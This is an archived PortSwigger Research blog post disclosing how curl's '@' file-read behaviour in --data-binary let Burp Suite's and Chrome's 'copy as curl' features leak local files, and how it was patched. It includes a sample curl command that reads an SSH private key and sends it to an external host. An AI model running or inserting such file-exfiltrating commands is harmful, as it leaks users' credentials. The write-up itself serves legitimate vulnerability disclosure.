---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-28_the-curl-quirk-that-exposed-burp-suite-google-chrome.md
original_filename: 2023-03-28_the-curl-quirk-that-exposed-burp-suite-google-chrome.md
title: The curl quirk that exposed Burp Suite & Google Chrome
category: documents
detected_topics:
- ssrf
- xss
- path-traversal
- csrf
- saml
- sqli
tags:
- imported
- documents
- ssrf
- xss
- path-traversal
- csrf
- saml
- sqli
language: en
raw_sha256: 743a0d606342eece4b84636f6cad66a146a9d609c53be7519b59834d6f08864b
text_sha256: 25e58e505a119e7d3b0948b1664c8188eaaa95ddae4a6b38c3c3ec716dafa54b
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# The curl quirk that exposed Burp Suite & Google Chrome

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-28_the-curl-quirk-that-exposed-burp-suite-google-chrome.md
- Source Type: markdown
- Detected Topics: ssrf, xss, path-traversal, csrf, saml, sqli
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `743a0d606342eece4b84636f6cad66a146a9d609c53be7519b59834d6f08864b`
- Text SHA256: `25e58e505a119e7d3b0948b1664c8188eaaa95ddae4a6b38c3c3ec716dafa54b`


## Content

---
title: "The curl quirk that exposed Burp Suite & Google Chrome"
page_title: "The curl quirk that exposed Burp Suite & Google Chrome | PortSwigger Research"
url: "https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome"
final_url: "https://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome"
authors: ["Paul Mutton (@paulmutton)"]
programs: ["PortSwigger", "Google (Chrome)"]
bugs: ["LFI"]
publication_date: "2023-03-28"
added_date: "2023-03-31"
source: "pentester.land/writeups.json"
original_index: 1333
---

[](/)

[Login](/users)

Products Solutions [Research](/research) [Academy](/web-security) Support Company

[Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[My account](/users/youraccount) [Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[ ![Burp Suite DAST](/content/images/svg/icons/enterprise.svg) **Burp Suite DAST** The enterprise-enabled dynamic web vulnerability scanner. ](/burp/enterprise) [ ![Burp Suite Professional](/content/images/svg/icons/professional.svg) **Burp Suite Professional** The world's #1 web penetration testing toolkit. ](/burp/pro) [ ![Burp Suite Community Edition](/content/images/svg/icons/community.svg) **Burp Suite Community Edition** The best manual tools to start web security testing. ](/burp/communitydownload) [View all product editions](/burp)

[ **Burp Scanner** Burp Suite's web vulnerability scanner ![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg) ](/burp/vulnerability-scanner)

[ **Attack surface visibility** Improve security posture, prioritize manual testing, free up time. ](/solutions/attack-surface-visibility) [ **CI-driven scanning** More proactive security - find and fix vulnerabilities earlier. ](/solutions/ci-driven-scanning) [ **Application security testing** See how our software enables the world to secure the web. ](/solutions) [ **DevSecOps** Catch critical bugs; ship more secure software, more quickly. ](/solutions/devsecops) [ **Penetration testing** Accelerate penetration testing - find more bugs, more quickly. ](/solutions/penetration-testing) [ **Automated scanning** Scale dynamic scanning. Reduce risk. Save time/money. ](/solutions/automated-security-testing) [ **Bug bounty hunting** Level up your hacking and earn more bug bounties. ](/solutions/bug-bounty-hunting) [ **Compliance** Enhance security monitoring to comply with confidence. ](/solutions/compliance)

[View all solutions](/solutions)

[ **Product comparison** What's the difference between Pro and DAST? ![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg) ](/burp/dast/resources/dast-vs-professional)

[ **Support Center** Get help and advice from our experts on all things Burp. ](/support) [ **Documentation** Tutorials and guides for Burp Suite. ](/burp/documentation) [ **Get Started - Professional** Get started with Burp Suite Professional. ](/burp/documentation/desktop/getting-started) [ **Get Started - DAST** Get started with Burp Suite DAST. ](/burp/documentation/dast/getting-started) [ **Downloads** Download the latest version of Burp Suite. ](/burp/releases)

[Visit the Support Center](/support)

[ **Downloads** Download the latest version of Burp Suite. ![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg) ](/burp/releases)

Articles

  * [Overview](/research)
  * Core Topics

[Black Hat](/research/black-hat) [XSS](/research/cross-site-scripting-research) [Request Smuggling](/research/request-smuggling) [Template Injection](/research/template-injection) [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)

  * [Articles](/research/articles)
  * Meet the Researchers

[James Kettle](/research/james-kettle) [Gareth Heyes](/research/gareth-heyes) [Zakhar Fedotkin](/research/zakhar-fedotkin)

  * [Talks](/research/talks)
  * [ RSS  ](/research/rss)

# The curl quirk that exposed Burp Suite & Google Chrome

  * [ ](https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fthe-curl-quirk-that-exposed-burp-suite-amp-google-chrome&text=The+curl+quirk+that+exposed+Burp+Suite+%26+Google+Chrome%20-%20%40PortSwiggerRes%0A)
  * [ ](https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fthe-curl-quirk-that-exposed-burp-suite-amp-google-chrome)
  * [ ](https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fthe-curl-quirk-that-exposed-burp-suite-amp-google-chrome)
  * [ ](https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fthe-curl-quirk-that-exposed-burp-suite-amp-google-chrome)
  * [ ](mailto:?subject=The+curl+quirk+that+exposed+Burp+Suite+%26+Google+Chrome&body=The+curl+quirk+that+exposed+Burp+Suite+%26+Google+Chrome%0A%0AIn+this+post%2C+we%27ll+explore+a+little-known+feature+in+curl+that+led+to+a+local-file+disclosure+vulnerability+in+both+Burp+Suite+Pro%2C+and+Google+Chrome.+We+patched+Burp+Suite+a+while+back%2C+but+suspect+%0A%0Ahttps://portswigger.net/research/the-curl-quirk-that-exposed-burp-suite-amp-google-chrome)
  * [ ](/research/rss)

![James Kettle](/content/images/profiles/callout_james_kettle_112px.png)

### [James Kettle](/research/james-kettle)

Director of Research

[@albinowax](https://twitter.com/albinowax)

  * **Published:** Tuesday, 28 March 2023 at 13:13 UTC

  * **Updated:** Tuesday, 28 March 2023 at 13:13 UTC

  * 

![A laptop using a fishing line to pick someone's pocket](/cms/images/56/e3/f99d-article-curl_quirk_blog-article.png)  

In this post, we'll explore a little-known feature in curl that led to a local-file disclosure vulnerability in both [Burp Suite Pro](https://portswigger.net/burp/pro), and Google Chrome. We patched Burp Suite a while back, but suspect the technique might be useful to exploit other applications that have a 'copy as curl' feature, or invoke curl from the command line. This vulnerability was privately reported to our [bug bounty program](https://hackerone.com/portswigger) by [Paul Mutton](https://twitter.com/paulmutton), and he's kindly agreed to let us publish this writeup.

Burp Suite users often craft complex HTTP requests to demonstrate vulnerabilities in websites. To make sharing these proof-of-concept exploits with other people easier, we have a `Copy as curl command` feature which generates a curl command that replicates a request inside Burp Suite.

For example, given the following request:

`POST / HTTP/1.1  
Host: portswigger.net  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 7  
  
foo=bar`

If you click `Copy as curl command`, Burp Suite will generate the following command and copy it to the clipboard:

`curl -i -s -k  
-X $'POST' \  
-H $'Host: portswigger.net' \  
-H $'Content-Type: application/x-www-form-urlencoded' \  
-H $'Content-Length: 7' \  
--data-binary $'foo=bar' \  
$'https://portswigger.net/'`

You can then paste this command into the terminal to re-issue the request outside Burp Suite. We're careful about escaping this data to avoid users being exploited by malicious requests injecting extra shell commands, or arbitrary curl arguments. 

Unfortunately, there's a subtler problem. Can you see it?

  

As usual, the answer lies in the [friendly manual](https://curl.se/docs/manpage.html#--data-binary): 

`--data-binary <data>  
  
This posts data exactly as specified with no extra processing whatsoever.  
  
If you start the data with the letter @, the rest should be a filename. `

So, this is safe:

`curl --data-binary '/home/albinowax/.ssh/id_rsa' --trace-ascii - https://02.rs/  
=> Send data, 28 bytes (0x1c)  
0000: /home/albinowax/.ssh/id_rsa`

And this is... not so safe:

`curl --data-binary '@/home/albinowax/.ssh/id_rsa' --trace-ascii - https://02.rs/  
=> Send data, 662 bytes (0x296)  
> -----BEGIN RSA PRIVATE KEY-----.b3BlbnNzaC1rZXktdjEA....`

(Not my real private key)

We patched this vulnerability in release 2020.5.1 by switching to the newer and safer but less-supported `--data-raw` flag if the request body starts with an @ symbol.

We were lucky in that exploiting this in Burp Suite required relatively heavy user-interaction - the attacker would have to induce a user to visit a malicious website, copy the crafted request as a curl command, and then execute it via the command line. If a website uses curl with an attacker-controlled request body, this could have a significantly higher impact, so it's definitely worth keeping an eye out for during [SSRF](/web-security/ssrf) testing. The @ file-read behaviour works with headers too, so it could be useful on sites that let you define a custom header.

Although this feature took us ([and Chrome](https://chromium.googlesource.com/devtools/devtools-frontend/+/d2663acda4ce90bc2b23e3569cbd21ad7df74593%5E%21/#F0)) by surprise, it is fully documented so we don't consider it to be a vulnerability in curl itself. It reminds me of [server-side template injection](/web-security/server-side-template-injection), where a sandbox escape can be as easy as reading a manual page everyone else overlooked.

Thanks again to Paul for sharing this cool technique.

Till next time!

[Back to all articles](/research/articles)

## Related Research

### [ 05 February 2026 ](/research/top-10-web-hacking-techniques-of-2025) ### [ 06 January 2026 ](/research/top-10-web-hacking-techniques-of-2025-nominations-open) ### [ The Fragile Lock: Novel Bypasses For SAML Authentication  10 December 2025 The Fragile Lock: Novel Bypasses For SAML Authentication ](/research/the-fragile-lock) ### [ Introducing HTTP Anomaly Rank 11 November 2025 Introducing HTTP Anomaly Rank ](/research/introducing-http-anomaly-rank)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner) [Burp Suite Editions](/burp) [Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting) [SQL injection](/web-security/sql-injection) [Cross-site request forgery](/web-security/csrf) [XML external entity injection](/web-security/xxe) [Directory traversal](/web-security/file-path-traversal) [Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations) [Testers](/testers) [Developers](/developers)

Company

[About](/about) [Careers](/careers) [Contact](/about/contact) [Legal](/legal) [Privacy Notice](/privacy) [Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security) [Blog](/blog) [Research](/research) [Engineering](/engineering)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/) [ Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.
